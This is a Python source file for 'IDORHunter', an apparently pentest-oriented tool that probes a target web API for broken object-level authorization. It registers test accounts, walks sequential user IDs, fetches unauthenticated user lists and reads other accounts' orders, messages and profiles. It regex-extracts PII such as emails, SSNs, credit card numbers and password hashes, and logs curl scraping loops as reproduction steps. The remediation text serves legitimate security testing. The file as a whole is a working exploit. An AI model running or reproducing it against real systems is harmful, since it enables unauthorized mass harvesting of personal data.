#!/usr/bin/env python3
"""IDORHunter — Broken Object Level Authorization (BOLA/IDOR) Exploit Prover.

Proves actual unauthorized data access:
- Registers two accounts, accesses account B's resources as account A
- Sequential ID walking: /api/users/1, /2, /3 — extracts actual PII
- UUID/GUID resource access without ownership
- Object-level: orders, invoices, messages, files, profiles
- Horizontal privilege escalation (user → user)
- Vertical privilege escalation (user → admin resources)
"""
import asyncio, aiohttp, json, re, sys, random, string, time
from pathlib import Path
from urllib.parse import urlparse

sys.path.insert(0, str(Path(__file__).parent))
from smart_filter import (
    delay, confidence_label, meets_confidence_floor,
    random_ua, REQUEST_DELAY,
)

PII_PATTERNS = [
    (r'"email"\s*:\s*"([^"@]{2,}@[^"]{2,})"',         "email"),
    (r'"phone(?:_number)?"\s*:\s*"([+\d\- ]{7,})"',    "phone"),
    (r'"(?:full_?name|name)"\s*:\s*"([A-Za-z ]{4,})"', "full_name"),
    (r'"address(?:_1)?"\s*:\s*"([^"]{5,})"',           "address"),
    (r'"(?:ssn|social_security)"\s*:\s*"([^"]{5,})"',  "ssn"),
    (r'"(?:dob|date_of_birth)"\s*:\s*"([^"]{5,})"',    "dob"),
    (r'"credit_card(?:_number)?"\s*:\s*"([^"]{8,})"',  "credit_card"),
    (r'"(?:balance|account_balance)"\s*:\s*([0-9.]+)',  "balance"),
    (r'"(?:token|api_key|secret)"\s*:\s*"([^"]{16,})"', "secret"),
    (r'"password_?(?:hash)?"\s*:\s*"([^"]{16,})"',      "password_hash"),
]

LOGIN_PATHS   = ["/api/auth/login",   "/api/login",   "/api/v1/auth/login",   "/api/v1/login",   "/auth/login", "/login"]
REGISTER_PATHS= ["/api/auth/register","/api/register","/api/v1/auth/register","/api/v1/register","/api/signup", "/api/users"]

OBJECT_PATHS  = [
    ("/api/users/{id}",       "user profile"),
    ("/api/v1/users/{id}",    "user profile"),
    ("/api/me",               "current user"),
    ("/api/profile/{id}",     "profile"),
    ("/api/orders/{id}",      "order"),
    ("/api/v1/orders/{id}",   "order"),
    ("/api/invoices/{id}",    "invoice"),
    ("/api/payments/{id}",    "payment"),
    ("/api/messages/{id}",    "message"),
    ("/api/documents/{id}",   "document"),
    ("/api/files/{id}",       "file"),
    ("/api/accounts/{id}",    "account"),
    ("/api/transactions/{id}","transaction"),
    ("/api/subscriptions/{id}","subscription"),
    ("/api/addresses/{id}",   "address"),
    ("/api/admin/users/{id}", "admin user view"),
    ("/api/v1/admin/users/{id}","admin user view"),
]

ID_ENDPOINTS  = [
    "/api/users", "/api/v1/users", "/api/admin/users",
    "/api/accounts", "/api/orders", "/api/customers",
]


def _rand_str(n=8):
    return ''.join(random.choices(string.ascii_lowercase, k=n))

def _extract_pii(body: str) -> dict:
    found = {}
    for pattern, label in PII_PATTERNS:
        m = re.search(pattern, body, re.IGNORECASE)
        if m:
            found[label] = m.group(1).strip()
    return found

def _extract_id(body: str, field_names=None) -> str | None:
    fields = field_names or ["id", "user_id", "userId", "uid", "_id", "account_id"]
    for f in fields:
        m = re.search(rf'"{f}"\s*:\s*"?([A-Za-z0-9\-_]{{1,36}})"?', body)
        if m:
            v = m.group(1)
            if re.match(r'^[0-9]+$', v) or re.match(r'^[0-9a-f\-]{8,}$', v, re.I):
                return v
    return None

def _extract_token(body: str) -> str | None:
    for pattern in [
        r'"(?:access_token|token|jwt|auth_token)"\s*:\s*"([^"]{20,})"',
        r'Bearer\s+([A-Za-z0-9\-_\.]{20,})',
        r'(eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{5,})',
    ]:
        m = re.search(pattern, body)
        if m:
            return m.group(1)
    return None


class IDORHunter:
    def __init__(self, target: str):
        self.target   = target.rstrip("/")
        self.findings = []
        parsed        = urlparse(target)
        self.host     = parsed.netloc

    def _finding(self, ftype, severity, conf, proof, detail, url,
                 remediation, exploitability, impact, reproducibility,
                 proof_type="UNAUTHORIZED_ACCESS", extra=None):
        if not meets_confidence_floor(conf):
            return
        f = {
            "type":              ftype,
            "severity":          severity,
            "confidence":        conf,
            "confidence_label":  confidence_label(conf),
            "url":               url,
            "proof":             proof,
            "detail":            detail,
            "remediation":       remediation,
            "proof_type":        proof_type,
            "exploitability":    exploitability,
            "impact":            impact,
            "reproducibility":   reproducibility,
            "auth_required":     True,
            "mitigation_layers": [
                "Object-level authorization check",
                "Ownership validation before data return",
                "Resource scoping to authenticated user",
            ],
            "mitre_technique":   "T1078",
            "mitre_name":        "Valid Accounts",
        }
        if extra:
            f.update(extra)
        self.findings.append(f)
        print(f"  [{severity}] {ftype}: {url}")

    async def _request(self, sess, method, url, headers=None, json_data=None, timeout=12):
        h = {"User-Agent": random_ua(), **(headers or {})}
        try:
            async with sess.request(
                method, url, headers=h, json=json_data,
                ssl=False, allow_redirects=True,
                timeout=aiohttp.ClientTimeout(total=timeout),
            ) as r:
                body = await r.text(errors="ignore")
                return r.status, body, dict(r.headers)
        except Exception:
            return None, "", {}

    async def _post(self, sess, path, json_data=None, headers=None):
        return await self._request(sess, "POST", self.target + path,
                                   headers=headers, json_data=json_data)

    async def _get(self, sess, path_or_url, headers=None, timeout=10):
        url = path_or_url if path_or_url.startswith("http") else self.target + path_or_url
        return await self._request(sess, "GET", url, headers=headers, timeout=timeout)

    async def _login(self, sess, path, username, password):
        for u_field in ["username", "email", "login"]:
            s, body, hdrs = await self._post(
                sess, path,
                json_data={u_field: username, "password": password},
            )
            await delay()
            if s in (200, 201) and len(body) > 30:
                token = _extract_token(body)
                uid   = _extract_id(body)
                if token or uid:
                    return token, uid, body
        return None, None, ""

    async def _register_and_login(self, sess):
        suffix = _rand_str(7)
        users = []
        for i in range(1, 3):
            uname = f"mirror_u{i}_{suffix}"
            email = f"{uname}@example.com"
            passw = f"MirrorTest@{suffix}{i}!X"
            for reg_path in REGISTER_PATHS:
                s, body, _ = await self._post(sess, reg_path, json_data={
                    "username": uname, "email": email, "password": passw,
                    "name": f"Mirror Test {i}", "confirm_password": passw,
                })
                await delay()
                if s in (200, 201) and len(body) > 10:
                    uid = _extract_id(body)
                    for login_path in LOGIN_PATHS:
                        token, uid2, body2 = await self._login(sess, login_path, email, passw)
                        if token:
                            uid = uid or uid2
                            users.append({
                                "username": uname, "email": email,
                                "password": passw, "token": token,
                                "uid": uid, "login_path": login_path,
                            })
                            print(f"  [*] Registered+logged user{i}: uid={uid} token={token[:30]}...")
                            break
                    break
                if s == 409:
                    break
        return users

    # ── Two-Account Cross-Access IDOR ────────────────────────────────────────

    async def test_two_account_idor(self, sess):
        print("\n[*] Registering two accounts to test cross-account IDOR...")
        users = await self._register_and_login(sess)
        if len(users) < 2:
            print("  [SKIP] Could not register two accounts — registration disabled or blocked")
            return

        user_a, user_b = users[0], users[1]

        for path_tpl, resource_name in OBJECT_PATHS:
            if "{id}" not in path_tpl:
                continue
            if user_b["uid"] is None:
                continue

            path_b = path_tpl.replace("{id}", user_b["uid"])
            auth_a  = {"Authorization": f"Bearer {user_a['token']}"}

            s_own, body_own, _ = await self._get(
                sess, path_b,
                headers={"Authorization": f"Bearer {user_b['token']}"},
            )
            await delay()
            if s_own not in (200, 201):
                continue

            s_idor, body_idor, _ = await self._get(sess, path_b, headers=auth_a)
            await delay()

            if s_idor == 200 and len(body_idor) > 50:
                pii = _extract_pii(body_idor)
                other_email = _extract_id(body_idor, ["email"])
                access_confirmed = (
                    (user_b["email"] in body_idor) or
                    (user_b["username"] in body_idor) or
                    bool(pii) or
                    user_b["uid"] in body_idor
                )
                if access_confirmed:
                    proof = (
                        f"User A (uid={user_a['uid']}) accessing User B's resource:\n"
                        f"  GET {path_b}  (owner=User B uid={user_b['uid']})\n"
                        f"  Authorization: Bearer <User A's token>\n"
                        f"→ HTTP {s_idor} — UNAUTHORIZED DATA RETURNED\n"
                        f"→ PII extracted: {json.dumps(pii) if pii else 'N/A'}\n"
                        f"→ Body contains User B email: {'YES' if user_b['email'] in body_idor else 'NO'}\n"
                        f"→ Body preview: {body_idor[:500]}"
                    )
                    self._finding(
                        ftype="IDOR_CROSS_ACCOUNT_DATA_ACCESS",
                        severity="CRITICAL",
                        conf=97,
                        proof=proof,
                        detail=(
                            f"IDOR confirmed on {resource_name} endpoint {path_b}. "
                            f"User A (uid={user_a['uid']}) can read User B's (uid={user_b['uid']}) "
                            f"private data by simply changing the ID in the URL."
                        ),
                        url=self.target + path_b,
                        remediation=(
                            "1. Check resource ownership before returning data: verify authenticated user owns the requested ID.\n"
                            "2. Scope all data queries to the authenticated user's session: SELECT ... WHERE user_id = $session_user_id AND id = $requested_id.\n"
                            "3. Use UUIDs instead of sequential IDs to reduce guessability (defence-in-depth, not a fix).\n"
                            "4. Add authorization unit tests for every object-level endpoint."
                        ),
                        exploitability=9,
                        impact=f"Unauthorized access to {resource_name} PII of any user — attacker iterates IDs to exfiltrate all user data. PII exposed: {', '.join(pii.keys()) if pii else 'user identifiers'}.",
                        reproducibility=(
                            f"# Step 1: login as User A, get token_a\n"
                            f"curl -s -X POST {self.target}{user_a['login_path']} -H 'Content-Type: application/json' -d '{{\"email\":\"{user_a['email']}\",\"password\":\"{user_a['password']}\"}}'\n"
                            f"# Step 2: access User B's resource with User A's token\n"
                            f"curl -s {self.target}{path_b} -H 'Authorization: Bearer <token_a>'"
                        ),
                        proof_type="UNAUTHORIZED_ACCESS",
                        extra={"victim_uid": user_b["uid"], "attacker_uid": user_a["uid"], "pii_extracted": pii},
                    )
                    return

    # ── Sequential ID Walking ─────────────────────────────────────────────────

    async def test_sequential_id_walk(self, sess):
        print("\n[*] Testing sequential ID walking (unauthenticated)...")
        for base_path in ["/api/users", "/api/v1/users", "/api/accounts",
                          "/api/orders", "/api/customers", "/api/admin/users"]:
            for uid in range(1, 8):
                path = f"{base_path}/{uid}"
                s, body, _ = await self._get(sess, path)
                await delay(0.12)
                if s == 200 and len(body) > 50:
                    pii = _extract_pii(body)
                    has_pii = bool(pii)
                    has_data = '"email"' in body or '"username"' in body or '"name"' in body
                    if has_pii or has_data:
                        proof = (
                            f"GET {path}  (unauthenticated, no token)\n"
                            f"→ HTTP {s} — user data returned!\n"
                            f"→ PII fields found: {', '.join(pii.keys()) if pii else 'email/username in body'}\n"
                            f"→ Body: {body[:500]}"
                        )
                        self._finding(
                            ftype="IDOR_UNAUTHENTICATED_USER_ENUMERATION",
                            severity="CRITICAL",
                            conf=95,
                            proof=proof,
                            detail=f"User data at {path} accessible without authentication. Sequential ID iteration exposes all user records.",
                            url=self.target + path,
                            remediation=(
                                "1. Require authentication for all user data endpoints.\n"
                                "2. Enforce object-level authorization: only return data belonging to the authenticated user (or admin with explicit role check).\n"
                                "3. Rate-limit enumeration: max 10 requests/minute on user data endpoints.\n"
                                "4. Replace integer IDs with unpredictable UUIDs."
                            ),
                            exploitability=10,
                            impact=f"Full user database exfiltration — attacker scrapes all user records with a loop: for i in 1..N; do curl /api/users/$i; done. PII exposed: {', '.join(pii.keys()) if pii else 'user identifiers'}.",
                            reproducibility=f"for i in $(seq 1 100); do curl -s {self.target}{base_path}/$i | jq '.email,.username,.name'; done",
                            proof_type="UNAUTHORIZED_ACCESS",
                            extra={"uid_tested": uid, "pii_extracted": pii},
                        )
                        return

    # ── Admin User List Exposure ──────────────────────────────────────────────

    async def test_user_list_exposure(self, sess):
        print("\n[*] Testing user list exposure without auth...")
        for path in ID_ENDPOINTS:
            s, body, _ = await self._get(sess, path)
            await delay(0.12)
            if s == 200 and len(body) > 100:
                pii = _extract_pii(body)
                count_match = re.search(r'"(?:total|count|total_count)"\s*:\s*(\d+)', body)
                count = int(count_match.group(1)) if count_match else 0
                list_match = re.search(r'\[\s*\{', body)
                if list_match and (pii or '"email"' in body or '"username"' in body):
                    proof = (
                        f"GET {path}  (no Authorization header)\n"
                        f"→ HTTP {s} — user list returned!\n"
                        f"→ Total records: {count or 'unknown'}\n"
                        f"→ PII fields: {', '.join(pii.keys()) if pii else 'email/username in array'}\n"
                        f"→ Body preview: {body[:600]}"
                    )
                    self._finding(
                        ftype="IDOR_USER_LIST_UNAUTHENTICATED",
                        severity="CRITICAL",
                        conf=95,
                        proof=proof,
                        detail=f"User list at {path} accessible without authentication. Returns all user records in a single request.",
                        url=self.target + path,
                        remediation=(
                            "1. Require Bearer token authentication on all list endpoints.\n"
                            "2. Admin-only lists must check the 'admin' role in the token, not just authentication.\n"
                            "3. Paginate results and log access.\n"
                            "4. Return only the authenticated user's own data unless explicitly admin-scoped."
                        ),
                        exploitability=10,
                        impact=f"Complete user database dump in one request. {count} records exposed including {', '.join(pii.keys()) if pii else 'user PII'}.",
                        reproducibility=f"curl -s {self.target}{path} | jq '.[].email'",
                        proof_type="UNAUTHORIZED_ACCESS",
                        extra={"total_records": count, "pii_extracted": pii},
                    )

    # ── Authenticated IDOR: Other User's Sensitive Objects ───────────────────

    async def test_object_idor_with_auth(self, sess):
        print("\n[*] Testing object IDOR with authentication (horizontal escalation)...")
        users = await self._register_and_login(sess)
        if not users:
            return
        user_a = users[0]
        auth_a = {"Authorization": f"Bearer {user_a['token']}"}

        for path_tpl, resource_name in OBJECT_PATHS:
            for test_id in ["1", "2", "3", "100", "999"]:
                if "{id}" in path_tpl:
                    path = path_tpl.replace("{id}", test_id)
                else:
                    path = path_tpl
                if user_a.get("uid") == test_id:
                    continue

                s, body, _ = await self._get(sess, path, headers=auth_a)
                await delay(0.1)
                if s == 200 and len(body) > 80:
                    pii = _extract_pii(body)
                    if pii:
                        proof = (
                            f"User A (uid={user_a['uid']}) accessing {resource_name} id={test_id}:\n"
                            f"  GET {path}\n"
                            f"  Authorization: Bearer <User A token>\n"
                            f"→ HTTP {s} — another user's data returned!\n"
                            f"→ PII extracted: {json.dumps(pii)}\n"
                            f"→ Body preview: {body[:400]}"
                        )
                        self._finding(
                            ftype=f"IDOR_AUTHENTICATED_{resource_name.upper().replace(' ', '_')}",
                            severity="HIGH",
                            conf=90,
                            proof=proof,
                            detail=f"Authenticated user can access {resource_name} (id={test_id}) belonging to another account. No ownership check at {path}.",
                            url=self.target + path,
                            remediation=(
                                "1. Always filter queries by the authenticated user's ID: WHERE owner_id = session.user_id.\n"
                                "2. Return 403 Forbidden (not 404) when an object exists but isn't owned by the requester.\n"
                                "3. Use a centralized authorization layer checked before every data retrieval.\n"
                                "4. Write regression tests that verify cross-user access returns 403."
                            ),
                            exploitability=8,
                            impact=f"Any authenticated user can read {resource_name} data of every other user by iterating IDs. PII: {', '.join(pii.keys())}.",
                            reproducibility=(
                                f"# Login as any user, then:\n"
                                f"curl -s {self.target}{path} -H 'Authorization: Bearer <any_valid_token>'"
                            ),
                            proof_type="UNAUTHORIZED_ACCESS",
                            extra={"accessed_id": test_id, "pii_extracted": pii, "resource": resource_name},
                        )
                        break

    async def run(self):
        print(f"\n{'='*60}\n  IDORHunter — BOLA/IDOR Exploit Prover\n  Target: {self.target}\n{'='*60}")
        timeout   = aiohttp.ClientTimeout(total=20, connect=8)
        connector = aiohttp.TCPConnector(ssl=False, limit=4)
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as sess:
            await self.test_sequential_id_walk(sess)
            await self.test_user_list_exposure(sess)
            await self.test_two_account_idor(sess)
            await self.test_object_idor_with_auth(sess)

        print(f"\n[+] IDORHunter complete: {len(self.findings)} confirmed findings")
        return self.findings


async def main():
    import os
    target = os.environ.get("ARSENAL_TARGET", "")
    if not target:
        print("[!] No target — set ARSENAL_TARGET", file=sys.stderr)
        sys.exit(1)
    scanner = IDORHunter(target)
    findings = await scanner.run()
    out = Path(__file__).parent.parent / "reports" / "idorhunter.json"
    out.write_text(json.dumps(findings, indent=2))
    print(f"[+] Saved {len(findings)} findings → {out}")

if __name__ == "__main__":
    asyncio.run(main())
